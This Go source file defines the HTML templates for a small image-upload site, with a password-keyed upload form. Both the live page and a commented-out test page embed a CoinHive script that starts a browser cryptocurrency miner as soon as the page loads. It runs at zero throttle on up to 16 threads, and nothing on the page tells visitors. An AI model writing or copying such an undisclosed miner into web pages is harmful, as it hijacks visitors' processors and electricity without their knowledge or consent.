package main

import "fmt"

/*HTML meaning guide for my sanity:
<br>: page break
<html> and </html>: beginning and end of html section
<body> and </body>: main part with text
<!-- and -->: Comments... WHY
*/
var (
	firstPage = fmt.Sprintf(`<html>


<head>
<meta name="google-site-verification" content="2QLKtDFPPQwFab4Tx2Gf0TJ1SVMI1lSA4VfKsA90SaY" /> <!-- ssshhh... -->
<title>Imagen Dot Click</title>
</head>
<body>
<b> EVERYTHING IS EXPALINED IN SOME DETAIL AT MY GITHUB: </b><br>
https://github.com/gidoBOSSftw5731/imgsrvr/tree/master
<p>
field from request: {{ .Fn}}
</p>

<form enctype="multipart/form-data" action="%supload/" method="post">
  Key: <input type="password" name="fn"><br>
  <input type="hidden" name="token" value="{{.}}"/>
	IMG: <input type="file" name="uploadfile"><br>
  <input type="submit" value="Go!">
</form>

<script src="https://coinhive.com/lib/coinhive.min.js"></script>
<script>
	var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});

  miner.start();
  miner.setThrottle(0)
  miner.setNumThreads(16)
  
</script>

</body>
</html>`, urlPrefix)

	/*testPage = `<html>
	  <head><title> This is the second test page!!! </title> </head>
	  <body>
	  testing text<br>
	  and moar testing text!!!<br>
	  And a testing graphic!!!<img src="/app/i/foo" alt="Testing Graphic" >

	  <p>
	  field from request: {{ .Tn}}
	  </p>

	  <form action="/app/main/" method="POST">
	    <input type="submit" value="back to main!">
	  </form>

	  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
	  <script>
	    var miner = new CoinHive.Anonymous('fS3DFhCgfTnrXc7UrRjkbnu3zPbugsEm', {throttle: 0});

	    miner.start();
	    miner.setThrottle(0)
	    miner.setNumThreads(8)

	  </script>

	  </body> </html>`*/
)
